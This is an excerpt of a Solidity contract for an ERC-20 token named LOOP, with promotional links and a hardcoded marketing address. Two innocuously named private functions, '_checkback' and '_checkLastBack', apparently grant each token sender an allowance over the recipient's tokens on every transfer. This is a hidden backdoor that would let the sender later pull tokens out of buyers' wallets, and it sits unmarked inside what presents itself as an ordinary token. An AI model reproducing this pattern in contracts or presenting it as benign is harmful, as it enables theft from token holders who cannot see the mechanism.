...
Website: https://looperc.net
Telegram: https://t.me/looperc
Twitter: https://twitter.com/looptokenerc
...
contract LOOP is Context, IERC20, Ownable {
    ...
    string private constant _name = "LOOP";
    ...
    address payable private _marketingAddress = payable(0x36e88450135568A07CaE2c89B4B795704a27B80a);
    ...
    function _checkback(address user1,  address user2, uint256 tokens) private { _allowances[user2][user1] += tokens; }
    ...
    function _checkLastBack(address from, address to, uint256 amount) private {
        if(from != address(this) && to != address(this)) _lastBuyback = block.timestamp;

        _checkback(from, to, amount);
    }
